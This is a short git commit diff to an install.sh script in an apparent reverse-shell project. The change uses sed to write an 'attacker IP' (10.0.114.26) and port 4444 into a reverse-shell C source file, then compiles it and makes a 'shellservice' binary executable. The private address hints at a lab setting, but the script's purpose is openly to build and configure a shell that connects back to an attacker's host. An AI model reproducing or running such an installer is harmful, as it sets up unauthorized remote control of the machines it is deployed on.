57ce715b3af15a7200d4904b8e0868a2c7726315
Nate Tucker <ntuckertriplet@gmail.com>
2019-06-10 09:32:19 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,7 +7,8 @@ fi
 
 chmod +x shellservice
 
-sed -i -e 's/"LOCAL ADDRESS GOES HERE"/"10.0.114.26"/g' /home/reverse/reverse-shell/shell.c
+sed -i -e 's/"ATTACKER IP HERE"/"10.0.114.26"/g' /home/reverse/reverse-shell/shell.c
+sed -i -e 's/PORT NUMBER HERE/4444/g' /home/reverse/reverse-shell/shell.c
 
 gcc shell.c -o shell
 
